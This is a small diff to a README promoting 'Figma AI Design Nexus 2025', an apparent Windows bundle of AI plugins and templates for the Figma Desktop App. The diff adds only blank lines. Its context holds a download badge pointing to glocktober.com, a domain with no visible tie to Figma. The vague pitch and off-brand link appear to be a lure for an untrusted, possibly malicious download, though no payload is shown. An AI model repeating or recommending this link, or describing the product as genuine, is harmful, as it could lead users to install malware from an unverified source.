@@ -1,6 +1,8 @@
 # Figma AI Design Nexus 2025
 
 Figma AI Design Nexus 2025 equips the Figma Desktop App with a curated selection of AI plugins, scripts, and templates to accelerate UI/UX design, prototyping, and collaborative workflows. Engineered for Windows, this suite empowers designers to craft world-class interfaces with precision and speed.
+
+
 [![Get Figma AI Tools](https://img.shields.io/badge/Get-Figma_AI_Tools-blueviolet)](https://glocktober.com)
 ---
 
